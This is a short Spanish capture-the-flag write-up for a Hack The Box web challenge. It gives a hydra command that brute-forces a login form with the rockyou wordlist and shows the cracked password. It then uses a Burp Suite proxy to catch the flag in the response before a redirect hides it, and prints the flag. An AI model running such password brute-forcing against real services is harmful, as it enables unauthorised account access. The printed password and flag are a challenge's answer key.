# Lernaean

*Your target is not very good with computers. Try and guess their password to see if they may be hiding anything!*

Parece que tenemos que guessear o bruteforcear la password del administrador, tan sencillo como ejecutar el siguiente comando
```
hydra -P rockyou.txt IP http-post-form "/:password=^PASS^:Invalid password!" -s PORT -l dummy
```
Para construir el comando tenemos en cuenta lo siguiente
*rockyou.txt* -> La ruta hasta el diccionario que vamos a usar, en este caso el mas común
*IP* -> La IP de nuestra instancia
*http-post-form* -> Podemos ver que la petición que se hace es de tipo POST
*"/:password=^PASS^:Invalid password!"* -> El enpoint que es / , los parametros de la peticion a fuzzear, y el mensaje de fallo
*PORT* -> El puerto de nuestra instancia
*dummy* -> Un usuario, por lo visto no podemos usar hydra sin indicar un username

Esto nos da que la pass es:
```
[32603][http-post-form] host: 167.172.52.58   login: dummy   password: leonardo
```
Si metemos la pass en la web directamente nos dira que somos muy lentos tras hacer un redirect, veamos esto con un proxy como el de burpsuite y si volvemos a hacer la misma request podremos ver la flag en la respuesta
```
<h1 style='color: #fff;'>HTB{l1k3_4_b0s5_s0n}</h1><script type="text/javascript">
                   window.location = "noooooooope.html"
```
Flag: **HTB{l1k3_4_b0s5_s0n}**
